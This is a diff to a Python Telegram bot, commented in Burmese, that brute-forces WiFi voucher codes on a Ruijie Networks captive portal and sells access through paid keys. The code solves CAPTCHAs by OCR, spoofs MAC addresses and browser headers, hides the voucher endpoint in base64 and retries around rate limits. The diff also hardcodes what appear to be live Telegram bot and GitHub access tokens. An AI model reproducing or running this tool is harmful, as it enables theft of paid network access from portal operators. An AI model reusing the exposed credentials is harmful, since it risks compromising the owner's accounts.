@@ -6,16 +6,12 @@ import ddddocr
 import numpy as np
 from datetime import datetime, timedelta, timezone
 
-# Bot Token အသစ် နှင့် သင့်ရဲ့ အချက်အလက်များ
-BOT_TOKEN = os.environ.get("BOT_TOKEN")
-GITHUB_TOKEN = os.environ.get("GITHUB_TOKEN")
-ADMIN_ID = os.environ.get("ADMIN_ID")
-REPO_OWNER = os.environ.get("REPO_OWNER", "yinnlinhtet-dot")
-REPO_NAME = os.environ.get("REPO_NAME", "my-telegram-bot")
-
-for _name, _value in (("BOT_TOKEN", BOT_TOKEN), ("GITHUB_TOKEN", GITHUB_TOKEN), ("ADMIN_ID", ADMIN_ID)):
-    if not _value:
-        raise RuntimeError(f"{_name} environment variable is required")
+#ဒီနေရာမှာchangeပေးပါbro
+BOT_TOKEN = '8628864483:AAEunN1NbE6UusgPS_rlzmYLN2PHO63SbWA'
+GITHUB_TOKEN = 'ghp_QYeZKZiHmKe6he8Kjimhh0VI4v1rXY3CnyEt'
+ADMIN_ID = "8991689638"
+REPO_OWNER = "yinnlinhtet-dot"
+REPO_NAME = "my-telegram-bot"
 ##################
 
 SUCCESS_CODE = asyncio.Queue()
@@ -87,18 +83,18 @@ async def handle_key(message):
             user_data[message.chat.id] = {}
             await bot.reply_to(
                 message,
-                "🔑 Key မှန်ကန်ပါသည်။ /input ဖြင့် Session URL ထည့်ပါ။"
+                " Key မှန်ကန်ပါသည်။ /input ဖြင့် Session URL ထည့်ပါ။"
             )
         else:
             approve[message.chat.id] = False
             await bot.reply_to(
                 message,
-                "❌ Key Expired ဖြစ်နေပါသည်။"
+                " Key Expired ဖြစ်နေပါသည်။"
             )
     else:
         await bot.reply_to(
             message,
-            "⚠️ သင်၏ key ကို registered မလုပ်ရသေးပါ။"
+            " သင်၏ key ကို registered မလုပ်ရသေးပါ။"
         )
 
 @bot.message_handler(commands=['listkeys'])
@@ -171,7 +167,7 @@ async def delkey(message):
         user_data.pop(int(user_id), None)
         await bot.reply_to(
             message,
-            f"🗑 Key Deleted\n\nUSER ID : {user_id}"
+            f" Key Deleted\n\nUSER ID : {user_id}"
         )
     except Exception as e:
         print(f"Error at delkey {e}")
@@ -208,7 +204,7 @@ async def genkey(message):
         )
         await bot.reply_to(
             message,
-            f"🔑 Key Generated\n\n"
+            f" Key Generated\n\n"
             f"USER ID : {user_id}\n"
             f"PLAN : {plan}\n"
             f"EXPIRES : {expiry}"
@@ -275,6 +271,9 @@ def generate_expiry(plan):
         return "9999-12-31T23:59:59Z"
     return (now + plans[plan]).isoformat()
 
+def get_current_time():
+    return datetime.now(timezone.utc)
+
 @bot.message_handler(commands=['recheck'])
 async def recheck(message):
     chat_id = message.chat.id
@@ -308,7 +307,7 @@ async def recheck(message):
                 if recode:
                     recheck_list.append(recode)
             to_show = "\n".join(recheck_list) if recheck_list else "Code များအားလုံးစစ်ဆေးပြီးပါပြီ မည်သည့် success code မျှရှာမတွေ့ပါ။"
-            await bot.reply_to(message, f"✅ Rechecked Codes:\n\n{to_show}")
+            await bot.reply_to(message, f"✅ Rechcked Codes:\n\n{to_show}")
             await save_rechecked_codes(chat_id_str, recheck_list, sha)
         else:
             await bot.reply_to(message, "သင့်တွင် success code တစ်ခုမျှမရှိသေးပါ။")
@@ -322,14 +321,24 @@ async def save_rechecked_codes(chat_id_str, recheck_list, sha):
 
 async def check_session_url(session_url):
     headers = {
-        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
+        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
         'accept-language': 'en-US,en;q=0.9',
+        'priority': 'u=0, i',
         'referer': session_url,
-        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36',
+        'sec-ch-ua': '"Chromium";v="148", "Microsoft Edge";v="148", "Not/A)Brand";v="99"',
+        'sec-ch-ua-mobile': '?0',
+        'sec-ch-ua-platform': '"Android"',
+        'sec-fetch-dest': 'document',
+        'sec-fetch-mode': 'navigate',
+        'sec-fetch-site': 'same-origin',
+        'upgrade-insecure-requests': '1',
+        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36 Edg/148.0.0.0',
+        'cookie': 'sensorsdata2015jssdkcross=%7B%22distinct_id%22%3A%2219e0ddbd9f2152-0df941f2efc6b08-4c657b58-1327104-19e0ddbd9f3a60%22%2C%22first_id%22%3A%22%22%2C%22props%22%3A%7B%22%24latest_traffic_source_type%22%3A%22%E8%87%AA%E7%84%B6%E6%90%9C%E7%B4%A2%E6%B5%81%E9%87%8F%22%2C%22%24latest_search_keyword%22%3A%22%E6%9C%AA%E5%8F%96%E5%88%B0%E5%80%BC%22%2C%22%24latest_referrer%22%3A%22https%3A%2F%2Fgemini.google.com%2F%22%7D%2C%22identities%22%3A%22eyIkaWRlbnRpdHlfY29va2llX2lkIjoiMTllMGRkYmQ5ZjIxNTItMGRmOTQxZjJlZmM2YjA4LTRjNjU3YjU4LTEzMjcxMDQtMTllMGRkYmQ5ZjNhNjAifQ%3D%3D%22%2C%22history_login_id%22%3A%7B%22name%22%3A%22%22%2C%22value%22%3A%22%22%7D%2C%22%24device_id%22%3A%2219e0ddbd9f2152-0df941f2efc6b08-4c657b58-1327104-19e0ddbd9f3a60%22%7D'
     }
     try:
         async with session.get(session_url, allow_redirects=True, headers=headers) as response:
             text_ = str(response.url)
+            print(text_)
             if "sessionId" in text_:
                 return True
             else:
@@ -347,18 +356,13 @@ async def handle_input(message):
         )
         return
     url = args[1]
-    if message.chat.id in user_data or str(message.chat.id) == ADMIN_ID:
-        approve[message.chat.id] = True
-        if message.chat.id not in user_data:
-            user_data[message.chat.id] = {}
+    if message.chat.id in user_data:
         await bot.reply_to(message, "Session URL အားစစ်ဆေးနေပါသည်။")
         if await check_session_url(session_url=url):
             user_data[message.chat.id]['session_url'] = url
             await bot.reply_to(message, "Session URL အားသိမ်းဆည်းပြီးပါပြီ။ /scan 6, 7, 8, all, ascii-lower စသည်ဖြင့်မိမိအသုံးပြုလိုတာကိုရွေးပြီး စတင်ပါ။")
         else:
             await bot.reply_to(message, f"Session URL မှားယွင်းနေပါသည်။")
-    else:
-        await bot.reply_to(message, "ကျေးဇူးပြု၍ ရှေးဦးစွာ /key ဖြင့် အတည်ပြုပါ။")
 
 @bot.message_handler(commands=['scan'])
 async def scan(message):
@@ -371,11 +375,13 @@ async def scan(message):
         return
     mode = args[1]
     chat_id = message.chat.id
-    if not approve.get(chat_id, False) and str(chat_id) != ADMIN_ID:
+    if not approve.get(chat_id, False):
         await bot.reply_to(message, "/scan ကိုအသုံးမပြုမီ /key ကိုအရင်ပြုလုပ်ပေးပါ။")
         return
+    chat_id = message.chat.id
     if chat_id not in user_data:
-        user_data[chat_id] = {}
+        await bot.reply_to(message, "/scan ကိုအသုံးမပြုမီ /key ကိုအရင်ပြုလုပ်ပေးပါ။")
+        return
     if 'session_url' not in user_data[chat_id]:
         await bot.reply_to(message, "/scan ကိုအသုံးမပြုမီ /input ဖြင့် Session URL ကိုအရင်ထည့်သွင်းပေးရပါမည်။")
         return
@@ -392,7 +398,7 @@ async def scan(message):
 
     progress_msg = await bot.send_message(
         chat_id,
-        "🔍 Scanning Codes...\n\n")
+        "🔍Scanning Codes...\n\n")
     scan_id = str(uuid.uuid4())
     task = asyncio.create_task(
         run_bruteforce(
@@ -512,17 +518,19 @@ def format_progress(checked, total=None, speed=0):
         filled = min(bar_length, int(percent / 5))
         bar = "█" * filled + "░" * (bar_length - filled)
         return (
-            f"🔍 Scanning Codes...\n\n"
-            f"📦 Checked : {checked:,}/{total:,}\n"
-            f"📊 Progress : {percent:.2f}%\n"
-            f"⚡ Speed : {speed_str}\n"
+            f"🔍Scanning Codes...\n\n"
+            f"📦Checked : {checked:,}/{total:,}\n"
+            f"📊Progress : {percent:.2f}%\n"
+             f"🔁Retry : {retries}\n"
+              f"⚡Speed : {speed_str}\n"
             f"[{bar}]"
         )
     return (
-        f"🔍 Scanning Codes...\n\n"
-        f"📦 Checked : {checked:,}\n"
-        f"⚡ Speed : {speed_str}\n"
-        f"📊 Status : running\n"
+        f"🔍Scanning Codes...\n\n"
+        f"📦Checked : {checked:,}\n"
+        f"⚡Speed : {speed_str}\n"
+        f"🔁Retry : {retries}\n"
+         f"📊Status : running\n"
     )
 
 BATCH_SIZE = 1000
@@ -562,21 +570,20 @@ async def run_bruteforce(mode, chat_id, session_url, scan_id, message=None, prog
                 break
 
             if time.monotonic() - last_key_check >= 600:
-                if str(chat_id) != ADMIN_ID:
-                    auth_list, _ = await get_file_content("auth_list.json")
-                    if (
-                        str(chat_id) not in auth_list
-                        or not check_key_expiration(auth_list[str(chat_id)])
-                    ):
-                        approve[chat_id] = False
-                        await bot.send_message(
-                            chat_id,
-                            "သင်၏ key သက်တမ်း ကုန်ဆုံးသွားပါပြီ။"
-                        )
-                        scan_tasks.pop(chat_id, None)
-                        success_messages.pop(chat_id, None)
-                        success_texts.pop(chat_id, None)
-                        return
+                auth_list, _ = await get_file_content("auth_list.json")
+                if (
+                    str(chat_id) not in auth_list
+                    or not check_key_expiration(auth_list[str(chat_id)])
+                ):
+                    approve[chat_id] = False
+                    await bot.send_message(
+                        chat_id,
+                        "သင်၏ key သက်တမ်း ကုန်ဆုံးသွားပါပြီ။"
+                    )
+                    scan_tasks.pop(chat_id, None)
+                    success_messages.pop(chat_id, None)
+                    success_texts.pop(chat_id, None)
+                    return
                 last_key_check = time.monotonic()
 
             async def _check(code):
@@ -607,9 +614,9 @@ async def run_bruteforce(mode, chat_id, session_url, scan_id, message=None, prog
 
         if progress_msg:
             finish_text = (
-                "🔍 Scanning Completed\n\n"
-                f"📦 Checked : {checked:,}\n"
-                "📊 Progress : 100%\n"
+                "🔍Scanning Completed\n\n"
+                f"📦Checked : {checked:,}\n"
+                "📊Progress : 100%\n"
                 "[██████████████████]"
             )
             try:
@@ -644,10 +651,19 @@ async def get_session_id(session, session_url, previous_session_id=None):
     mac = get_mac()
     session_url = replace_mac(session_url, new_mac=mac)
     headers = {
-        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
+        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
         'accept-language': 'en-US,en;q=0.9',
+        'priority': 'u=0, i',
         'referer': session_url,
-        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36',
+        'sec-ch-ua': '"Chromium";v="148", "Microsoft Edge";v="148", "Not/A)Brand";v="99"',
+        'sec-ch-ua-mobile': '?0',
+        'sec-ch-ua-platform': '"Android"',
+        'sec-fetch-dest': 'document',
+        'sec-fetch-mode': 'navigate',
+        'sec-fetch-site': 'same-origin',
+        'upgrade-insecure-requests': '1',
+        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36 Edg/148.0.0.0',
+        'cookie': 'sensorsdata2015jssdkcross=%7B%22distinct_id%22%3A%2219e0ddbd9f2152-0df941f2efc6b08-4c657b58-1327104-19e0ddbd9f3a60%22%2C%22first_id%22%3A%22%22%2C%22props%22%3A%7B%22%24latest_traffic_source_type%22%3A%22%E8%87%AA%E7%84%B6%E6%90%9C%E7%B4%A2%E6%B5%81%E9%87%8F%22%2C%22%24latest_search_keyword%22%3A%22%E6%9C%AA%E5%8F%96%E5%88%B0%E5%80%BC%22%2C%22%24latest_referrer%22%3A%22https%3A%2F%2Fgemini.google.com%2F%22%7D%2C%22identities%22%3A%22eyIkaWRlbnRpdHlfY29va2llX2lkIjoiMTllMGRkYmQ5ZjIxNTItMGRmOTQxZjJlZmM2YjA4LTRjNjU3YjU4LTEzMjcxMDQtMTllMGRkYmQ5ZjNhNjAifQ%3D%3D%22%2C%22history_login_id%22%3A%7B%22name%22%3A%22%22%2C%22value%22%3A%22%22%7D%2C%22%24device_id%22%3A%2219e0ddbd9f2152-0df941f2efc6b08-4c657b58-1327104-19e0ddbd9f3a60%22%7D'
     }
     try:
         async with session.get(session_url, headers=headers, allow_redirects=True) as req:
@@ -658,6 +674,7 @@ async def get_session_id(session, session_url, previous_session_id=None):
             else:
                 return previous_session_id
     except:
+        print("Session ID Fetch Error")
         return previous_session_id
 
 def replace_mac(url, new_mac):
@@ -686,9 +703,15 @@ async def Code_Expires_Date(session_id):
     headers = {
         'authority': 'portal-as.ruijienetworks.com',
         'accept': 'application/json, text/javascript, */*; q=0.01',
-        'accept-language': 'en-US,en;q=0.9',
+        'accept-language': 'en-US,en;q=0.9,my;q=0.8',
         'content-type': 'application/json;',
         'referer': 'https://portal-as.ruijienetworks.com/download/static/maccauth/src/balance.html',
+        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
+        'sec-ch-ua-mobile': '?0',
+        'sec-ch-ua-platform': '"Linux"',
+        'sec-fetch-dest': 'empty',
+        'sec-fetch-mode': 'cors',
+        'sec-fetch-site': 'same-origin',
         'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
         'x-requested-with': 'XMLHttpRequest',
     }
@@ -709,6 +732,7 @@ async def Code_Expires_Date(session_id):
                 totaltime = Minute_to_Hour(respond.get('result', {}).get('totalMinutes', 'Unknown'))
                 return f"📋 Plan: {profile_name} | ⏳ Time: {totaltime}"
     except Exception as e:
+        print(f"[Code_Expires_Date] error: {e}")
         return "📋 Plan: Unknown | ⏳ Time: Unknown"
 
 async def perform_check(session_url, code, chat_id, scan_id=None, recheck=False, message=None):
@@ -719,7 +743,7 @@ async def perform_check(session_url, code, chat_id, scan_id=None, recheck=False,
             return
 
     post_url = base64.b64decode(
-        b'aHR0cHM6Ly9wb3J0YWwtas.ruijienetworks.com/api/auth/voucher/?lang=en_US'
+        b'aHR0cHM6Ly9wb3J0YWwtYXMucnVpamllbmV0d29ya3MuY29tL2FwaS9hdXRoL3ZvdWNoZXIvP2xhbmc9ZW5fVVM='
     ).decode()
 
     response = None
@@ -748,7 +772,7 @@ async def perform_check(session_url, code, chat_id, scan_id=None, recheck=False,
                         auth_code = text
                         break
                 except Exception as e:
-                    pass
+                    print(f"[perform_check] captcha error: {e}")
             if not auth_code:
                 return
 
@@ -773,15 +797,25 @@ async def perform_check(session_url, code, chat_id, scan_id=None, recheck=False,
                     f"https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html"
                     f"?RES=./../expand/res/mrlev58jlgslg49ervu&IS_EG=0&sessionId={session_id}"
                 ),
+                "sec-ch-ua": '"Chromium";v="139", "Not;A=Brand";v="99"',
+                "sec-ch-ua-mobile": "?1",
+                "sec-ch-ua-platform": '"Android"',
+                "sec-fetch-dest": "empty",
+                "sec-fetch-mode": "cors",
+                "sec-fetch-site": "same-origin",
                 "user-agent": "Mozilla/5.0 (Linux; Android 12; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
             }
             try:
                 async with task_session.post(post_url, json=data, headers=headers) as req:
                     response = await req.text()
+                    resp_json = json.loads(response)
+                    print(f"[voucher] code={code} attempt={_attempt+1} status={req.status} resp={resp_json}")
             except Exception as e:
+                print(f"[perform_check] error: {e}")
                 return
 
         if response and 'request limited' in response:
+            print(f"[perform_check] rate limited on code={code}, retrying (attempt {_attempt+1}/3)")
             continue
         break
 
@@ -829,9 +863,9 @@ async def perform_check(session_url, code, chat_id, scan_id=None, recheck=False,
                             )
                             success_messages[chat_id] = sent.message_id
                         except Exception as err:
-                            pass
+                            print(f"Success Fallback Error: {err}")
             except Exception as e:
-                pass
+                print(f"Success Message Error: {e}")
                 
     elif 'STA' in response:
         if chat_id not in limited_texts:
@@ -859,9 +893,17 @@ async def perform_check(session_url, code, chat_id, scan_id=None, recheck=False,
                             parse_mode="HTML"
                         )
                     except Exception as e:
-                        pass
+                        try:
+                            sent = await bot.send_message(
+                                chat_id=message.chat.id,
+                                text=f"Limited Codes:\n\n{limited_line}",
+                                parse_mode="HTML"
+                            )
+                            limited_messages[chat_id] = sent.message_id
+                        except Exception as err:
+                            print(f"Limited Fallback Error: {err}")
             except Exception as e:
-                pass
+                print(f"Limited Message Error: {e}")
 
 _ocr = ddddocr.DdddOcr(show_ad=False)
 
@@ -884,8 +926,14 @@ async def Captcha_Image(session, session_id):
     headers = {
         'authority': 'portal-as.ruijienetworks.com',
         'accept': 'image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8',
-        'accept-language': 'en-US,en;q=0.9',
+        'accept-language': 'en-US,en;q=0.9,my;q=0.8',
         'referer': 'https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html',
+        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
+        'sec-ch-ua-mobile': '?0',
+        'sec-ch-ua-platform': '"Linux"',
+        'sec-fetch-dest': 'image',
+        'sec-fetch-mode': 'no-cors',
+        'sec-fetch-site': 'same-origin',
         'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
     }
     params = {
@@ -899,10 +947,16 @@ async def Varify_Captcha(session, session_id, text):
     headers = {
         'authority': 'portal-as.ruijienetworks.com',
         'accept': '*/*',
-        'accept-language': 'en-US,en;q=0.9',
+        'accept-language': 'en-US,en;q=0.9,my;q=0.8',
         'content-type': 'application/json',
         'origin': 'https://portal-as.ruijienetworks.com',
         'referer': 'https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html',
+        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
+        'sec-ch-ua-mobile': '?0',
+        'sec-ch-ua-platform': '"Linux"',
+        'sec-fetch-dest': 'empty',
+        'sec-fetch-mode': 'cors',
+        'sec-fetch-site': 'same-origin',
         'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
     }
     json_data = {
@@ -911,6 +965,7 @@ async def Varify_Captcha(session, session_id, text):
     }
     async with session.post('https://portal-as.ruijienetworks.com/api/auth/captcha/verify', headers=headers, json=json_data) as req:
         data = await req.json()
+        print(f"[Varify_Captcha] status={req.status} authCode={text} response={data}")
         if data.get("success") == True:
             return session_id
         else:
@@ -923,9 +978,11 @@ async def start_polling():
             await bot.infinity_polling(timeout=20, request_timeout=20)
             return
         except (aiohttp.ClientError, asyncio.TimeoutError) as e:
+            print(f"Polling connection error: {e}. Reconnecting in {backoff}s...")
             await asyncio.sleep(backoff)
             backoff = min(backoff * 2, 60)
         except Exception as e:
+            print(f"Unexpected polling error: {e}. Reconnecting in {backoff}s...")
             await asyncio.sleep(backoff)
             backoff = min(backoff * 2, 60)
 
@@ -952,4 +1009,3 @@ async def main():
 
 if __name__ == '__main__':
     asyncio.run(main())
-
